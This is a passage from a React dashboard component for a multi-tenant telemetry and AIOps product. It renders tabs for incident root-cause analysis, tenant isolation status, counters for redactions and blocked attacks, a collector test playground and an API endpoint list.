              Correlated Incidents & Explainable Root Cause Analysis (RCA)
            </h3>

            {(!aiopsData.incidents || aiopsData.incidents.length === 0) ? (
              <div style={{ padding: '36px', textAlign: 'center', color: 'var(--text-muted)', fontSize: '0.82rem' }}>
                No active correlated incidents in partition {currentUser.tenantId}.
              </div>
            ) : (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
                {aiopsData.incidents.map((inc) => (
                  <div key={inc.incidentId} style={{
                    background: 'var(--bg-canvas)',
                    border: '1px solid var(--border-subtle)',
                    borderRadius: '6px',
                    padding: '18px',
                  }}>
                    <div style={{ display: 'flex', flexWrap: 'wrap', justifyContent: 'space-between', alignItems: 'center', gap: '10px', marginBottom: '12px' }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                        <span className="badge-minimal" style={{
                          background: 'var(--color-rose-subtle)',
                          color: 'var(--color-rose)',
                          border: '1px solid rgba(244, 63, 94, 0.3)',
                        }}>
                          {inc.severity}
                        </span>
                        <h4 style={{ fontSize: '0.92rem', fontWeight: '600' }}>{inc.title}</h4>
                      </div>
                      <span style={{ fontSize: '0.74rem', color: 'var(--text-muted)' }}>
                        Status: <strong>{inc.status}</strong> · Correlated events: {inc.eventCount}
                      </span>
                    </div>

                    {/* RCA Box */}
                    {inc.rca && (
                      <div style={{
                        background: 'var(--bg-surface)',
                        borderLeft: '3px solid var(--accent)',
                        padding: '12px 16px',
                        borderRadius: '0 6px 6px 0',
                        marginBottom: '14px',
                      }}>
                        <span style={{ fontSize: '0.72rem', fontWeight: '600', color: 'var(--accent)', textTransform: 'uppercase' }}>
                          Explainable Diagnosis (Confidence: {Math.round((inc.rca.confidence || 0.8) * 100)}%)
                        </span>
                        <p style={{ fontSize: '0.85rem', color: 'var(--text-primary)', marginTop: '4px', marginBottom: '8px' }}>
                          {inc.rca.probableRootCause}
                        </p>
                        {inc.rca.causalChain && inc.rca.causalChain.length > 0 && (
                          <div style={{ fontSize: '0.75rem', color: 'var(--text-secondary)' }}>
                            <strong>Causal chain:</strong> {inc.rca.causalChain.join(' → ')}
                          </div>
                        )}
                      </div>
                    )}

                    {/* Prescriptive Remediation Runbooks */}
                    {inc.recommendations && inc.recommendations.length > 0 && (
                      <div>
                        <span style={{ fontSize: '0.74rem', fontWeight: '600', color: 'var(--text-muted)', textTransform: 'uppercase' }}>
                          Prescriptive Remediation Runbooks:
                        </span>
                        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(260px, 1fr))', gap: '8px', marginTop: '8px' }}>
                          {inc.recommendations.map((rec) => (
                            <div key={rec.id} style={{
                              background: 'var(--bg-surface)',
                              border: '1px solid var(--border-subtle)',
                              borderRadius: '4px',
                              padding: '10px 12px',
                            }}>
                              <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '4px' }}>
                                <strong style={{ fontSize: '0.78rem' }}>{rec.title}</strong>
                                <span style={{ fontSize: '0.7rem', color: 'var(--color-amber)', fontWeight: '600' }}>{rec.priority}</span>
                              </div>
                              <p style={{ fontSize: '0.74rem', color: 'var(--text-secondary)', marginBottom: '6px' }}>
                                {rec.description}
                              </p>
                              {rec.command && (
                                <code style={{
                                  display: 'block',
                                  background: 'var(--code-bg)',
                                  border: '1px solid var(--border-subtle)',
                                  padding: '4px 8px',
                                  borderRadius: '4px',
                                  fontSize: '0.7rem',
                                  color: 'var(--accent)',
                                  fontFamily: 'var(--font-mono)',
                                }}>
                                  $ {rec.command}
                                </code>
                              )}
                            </div>
                          ))}
                        </div>
                      </div>
                    )}
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}

      {/* TAB 2: Tenant Partition Status & Strict Isolation */}
      {activeTab === 'partition' && (
        <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
          <div className="card-minimal" style={{ padding: '24px' }}>
            <h3 style={{ fontSize: '1rem', fontWeight: '600', marginBottom: '8px' }}>
              Tenant Partition & Isolation Boundary
            </h3>
            <p style={{ fontSize: '0.82rem', color: 'var(--text-secondary)', marginBottom: '18px' }}>
              Your account is isolated within partition <code>{currentUser.tenantId}</code>. Strict zero-cross-tenant visibility ensures no other tenant can view your data, and credentials are permanently masked.
            </p>

            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(260px, 1fr))', gap: '14px', marginBottom: '22px' }}>
              <div style={{ background: 'var(--bg-canvas)', padding: '14px', borderRadius: '6px', border: '1px solid var(--border-subtle)' }}>
                <span style={{ fontSize: '0.72rem', color: 'var(--text-muted)' }}>TENANT IDENTIFIER</span>
                <div style={{ fontSize: '1.05rem', fontWeight: '600', marginTop: '4px' }}>{currentUser.tenantId}</div>
                <span style={{ fontSize: '0.7rem', color: 'var(--color-emerald)', marginTop: '2px', display: 'block' }}>● Dedicated Row-Level Scope</span>
              </div>

              <div style={{ background: 'var(--bg-canvas)', padding: '14px', borderRadius: '6px', border: '1px solid var(--border-subtle)' }}>
                <span style={{ fontSize: '0.72rem', color: 'var(--text-muted)' }}>AUTHENTICATED OPERATOR</span>
                <div style={{ fontSize: '1.05rem', fontWeight: '600', marginTop: '4px', fontFamily: 'var(--font-mono)' }}>
                  {currentUser.maskedIdentifier}
                </div>
                <span style={{ fontSize: '0.7rem', color: 'var(--accent)', marginTop: '2px', display: 'block' }}>● Credential Masking Enforced</span>
              </div>

              <div style={{ background: 'var(--bg-canvas)', padding: '14px', borderRadius: '6px', border: '1px solid var(--border-subtle)' }}>
                <span style={{ fontSize: '0.72rem', color: 'var(--text-muted)' }}>PASSWORD INTEGRITY</span>
                <div style={{ fontSize: '1.05rem', fontWeight: '600', marginTop: '4px' }}>
                  ••••••••••••
                </div>
                <span style={{ fontSize: '0.7rem', color: 'var(--color-emerald)', marginTop: '2px', display: 'block' }}>● Scrypt Hashed (Tenant-Side Only)</span>
              </div>
            </div>

            {/* Zero-Cross-Tenant Assurance Callout */}
            <div style={{
              background: 'var(--accent-subtle)',
              border: '1px solid var(--border-accent)',
              borderRadius: '6px',
              padding: '16px 20px',
            }}>
              <h4 style={{ fontSize: '0.88rem', fontWeight: '600', color: 'var(--text-primary)', marginBottom: '6px' }}>
                🛡️ Multi-Tenant Isolation Architecture
              </h4>
              <ul style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', paddingLeft: '18px', display: 'flex', flexDirection: 'column', gap: '4px' }}>
                <li><strong>Row-Level Segregation:</strong> All SQLite queries strictly filter on <code>WHERE tenant_id = ?</code>.</li>
                <li><strong>Memory Buffer Partitioning:</strong> Ring buffers and audit logs maintain disjoint ring capacity per tenant.</li>
                <li><strong>Anomaly Baseline Separation:</strong> Statistical Z-score profiles are maintained independently so other tenants cannot poison your baselines.</li>
                <li><strong>Credential Zero-Retention:</strong> Passwords never leave your control in plaintext and are salted with cryptographic 16-byte random salts.</li>
              </ul>
            </div>
          </div>
        </div>
      )}

      {/* TAB 3: Threat Shield & DLP */}
      {activeTab === 'shield' && (
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(360px, 1fr))', gap: '20px' }}>
          {/* DLP Breakdown */}
          <div className="card-minimal" style={{ padding: '20px' }}>
            <h3 style={{ fontSize: '0.92rem', fontWeight: '600', marginBottom: '4px' }}>
              Data Loss Prevention (DLP) Purges
            </h3>
            <p style={{ fontSize: '0.78rem', color: 'var(--text-secondary)', marginBottom: '14px' }}>
              Real-time heuristic filter redacting sensitive secrets before telemetry storage.
            </p>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
              {[
                { type: 'API & Cloud Keys (OpenAI, AWS, GitHub)', count: collectorStats.leakBreakdown?.API_KEY || 0 },
                { type: 'Bearer & JWT Authentication Tokens', count: collectorStats.leakBreakdown?.BEARER_TOKEN || 0 },
                { type: 'Plaintext Passwords & Auth Headers', count: collectorStats.leakBreakdown?.PASSWORD || 0 },
                { type: 'Credit Card Numbers (PCI-DSS)', count: collectorStats.leakBreakdown?.CREDIT_CARD || 0 },
                { type: 'Social Security Numbers (SSN)', count: collectorStats.leakBreakdown?.SSN || 0 },
                { type: 'Personal Email Addresses (PII)', count: collectorStats.leakBreakdown?.EMAIL || 0 },
              ].map((item, idx) => (
                <div key={idx} style={{
                  display: 'flex',
                  justifyContent: 'space-between',
                  alignItems: 'center',
                  background: 'var(--bg-canvas)',
                  padding: '9px 12px',
                  borderRadius: '6px',
                  border: '1px solid var(--border-subtle)',
                  fontSize: '0.78rem',
                }}>
                  <span>{item.type}</span>
                  <strong style={{ color: item.count > 0 ? 'var(--accent)' : 'var(--text-muted)' }}>
                    {item.count} Redacted
                  </strong>
                </div>
              ))}
            </div>
          </div>

          {/* Attack Shield Breakdown */}
          <div className="card-minimal" style={{ padding: '20px' }}>
            <h3 style={{ fontSize: '0.92rem', fontWeight: '600', marginBottom: '4px' }}>
              Threat Shield & Perimeter Defense
            </h3>
            <p style={{ fontSize: '0.78rem', color: 'var(--text-secondary)', marginBottom: '14px' }}>
              Drops injection attempts, volumetric flooding, and payload expansion attacks.
            </p>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
              {[
                { name: 'SQL Injection Exploits (SQLi)', count: collectorStats.attackBreakdown?.SQL_INJECTION || 0 },
                { name: 'Cross-Site Scripting Exploits (XSS)', count: collectorStats.attackBreakdown?.XSS_ATTACK || 0 },
                { name: 'Remote Command Execution (RCE)', count: collectorStats.attackBreakdown?.COMMAND_INJECTION || 0 },
                { name: 'Volumetric Floods & DDoS', count: collectorStats.attackBreakdown?.DDOS_FLOOD || 0 },
                { name: 'Payload Depth Bombs', count: collectorStats.attackBreakdown?.PAYLOAD_BOMB || 0 },
                { name: 'Rate Limit Violations', count: collectorStats.attackBreakdown?.RATE_LIMIT_EXCEEDED || 0 },
              ].map((item, idx) => (
                <div key={idx} style={{
                  display: 'flex',
                  justifyContent: 'space-between',
                  alignItems: 'center',
                  background: 'var(--bg-canvas)',
                  padding: '9px 12px',
                  borderRadius: '6px',
                  border: '1px solid var(--border-subtle)',
                  fontSize: '0.78rem',
                }}>
                  <span>{item.name}</span>
                  <strong style={{ color: item.count > 0 ? 'var(--color-rose)' : 'var(--text-muted)' }}>
                    {item.count} Blocked
                  </strong>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* TAB 4: Quantum Collector Playground */}
      {activeTab === 'playground' && (
        <div className="card-minimal" style={{ padding: '20px' }}>
          <h3 style={{ fontSize: '0.95rem', fontWeight: '600', marginBottom: '6px' }}>
            Collector Interactive Playground
          </h3>
          <p style={{ fontSize: '0.78rem', color: 'var(--text-secondary)', marginBottom: '14px' }}>
            Send live user payloads into <code>POST /api/collector</code> scoped to partition <code>{currentUser.tenantId}</code> to inspect zero-raw sanitization.
          </p>

          <div style={{ display: 'flex', flexWrap: 'wrap', gap: '8px', marginBottom: '14px' }}>
            {Object.entries(PRESETS).map(([key, preset]) => (
              <button
                key={key}
                onClick={() => setPlaygroundInput(JSON.stringify(preset.data, null, 2))}
                className="btn-minimal"
                style={{ fontSize: '0.75rem' }}
              >
                {preset.name}
              </button>
            ))}
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(320px, 1fr))', gap: '14px' }}>
            <div>
              <label style={{ fontSize: '0.74rem', fontWeight: '600', color: 'var(--text-secondary)' }}>
                Input: Raw User Payload
              </label>
              <textarea
                value={playgroundInput}
                onChange={(e) => setPlaygroundInput(e.target.value)}
                rows={13}
                style={{
                  width: '100%',
                  marginTop: '6px',
                  background: 'var(--code-bg)',
                  border: '1px solid var(--border-subtle)',
                  borderRadius: '6px',
                  padding: '12px',
                  color: 'var(--text-primary)',
                  fontFamily: 'var(--font-mono)',
                  fontSize: '0.78rem',
                  outline: 'none',
                }}
              />
              <button
                onClick={handlePlaygroundSubmit}
                disabled={playgroundRunning}
                className="btn-minimal-primary"
                style={{ marginTop: '8px' }}
              >
                {playgroundRunning ? 'Sanitizing Payload...' : 'Dispatch to Edge Collector'}
              </button>
            </div>

            <div>
              <label style={{ fontSize: '0.74rem', fontWeight: '600', color: 'var(--text-secondary)' }}>
                Output: Sanitized Metadata (Zero Raw Data)
              </label>
              <pre style={{
                marginTop: '6px',
                background: 'var(--code-bg)',
                border: `1px solid ${playgroundResult?.httpStatus === 403 ? 'var(--color-rose)' : 'var(--border-subtle)'}`,
                borderRadius: '6px',
                padding: '12px',
                color: playgroundResult?.httpStatus === 403 ? 'var(--color-rose)' : 'var(--accent)',
                fontFamily: 'var(--font-mono)',
                fontSize: '0.78rem',
                minHeight: '260px',
                maxHeight: '380px',
                overflowY: 'auto',
                whiteSpace: 'pre-wrap',
              }}>
                {playgroundResult ? JSON.stringify(playgroundResult, null, 2) : '// Click "Dispatch to Edge Collector" to test sanitization'}
              </pre>
            </div>
          </div>
        </div>
      )}

      {/* TAB 5: Architecture & API Endpoints */}
      {activeTab === 'api' && (
        <div className="card-minimal" style={{ padding: '20px' }}>
          <h3 style={{ fontSize: '0.95rem', fontWeight: '600', marginBottom: '14px' }}>
            System Endpoints & Authentication Architecture
          </h3>

          <div style={{ display: 'flex', flexDirection: 'column', gap: '8px', fontFamily: 'var(--font-mono)' }}>
            {[
              { method: 'POST', endpoint: '/api/auth?action=signup', desc: 'Provisions tenant partition & user with scrypt-hashed password and random salt.' },
              { method: 'POST', endpoint: '/api/auth?action=signin', desc: 'Constant-time verification of email/mobile + password, returns masked user session.' },
              { method: 'GET', endpoint: '/api/auth?action=me', desc: 'Validates Bearer session token and returns authenticated tenant metadata.' },
              { method: 'POST', endpoint: '/api/collector', desc: 'Edge collector: raw data stripping, DLP leak purge, threat shield, metadata forwarding.' },
              { method: 'GET', endpoint: '/api/collector', desc: 'Collector metrics, buffer capacity, and real-time security attack & leak audits.' },
              { method: 'GET', endpoint: '/api/aiops?tenantId={id}', desc: 'AIOps intelligence: neural health score, baseline anomalies, incident clusters, RCA.' },
              { method: 'POST', endpoint: '/api/simulate', desc: 'Simulates telemetry ("spikes", "outages", "failed_logins") with real-time AI incident correlation.' },
            ].map((api, idx) => (
              <div key={idx} style={{
                background: 'var(--bg-canvas)',
                border: '1px solid var(--border-subtle)',
                borderRadius: '6px',
                padding: '10px 14px',
                display: 'flex',
                alignItems: 'center',
                gap: '12px',
                flexWrap: 'wrap',
              }}>
                <span className="badge-minimal" style={{
                  background: api.method === 'POST' ? 'var(--accent-subtle)' : 'var(--color-emerald-subtle)',
                  color: api.method === 'POST' ? 'var(--accent)' : 'var(--color-emerald)',
                  border: `1px solid ${api.method === 'POST' ? 'var(--border-accent)' : 'rgba(16, 185, 129, 0.3)'}`,
                }}>
                  {api.method}
                </span>
                <code style={{ fontSize: '0.8rem', fontWeight: '600' }}>
                  {api.endpoint}
                </code>
                <span style={{ fontSize: '0.76rem', color: 'var(--text-secondary)', marginLeft: 'auto', fontFamily: 'inherit' }}>
                  {api.desc}
                </span>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Minimalist Footer */}
      <footer style={{
        marginTop: '40px',
        paddingTop: '18px',
        borderTop: '1px solid var(--border-subtle)',
        display: 'flex',
        flexWrap: 'wrap',
        justifyContent: 'space-between',
        alignItems: 'center',
        fontSize: '0.74rem',
        color: 'var(--text-muted)',
        gap: '12px',
      }}>
        <div>
          Cicada Telemetry & AIOps Ecosystem
        </div>
        <div>
          Row-Level Tenant Isolation Active · Credentials Masked
        </div>
      </footer>
    </div>
  );
}
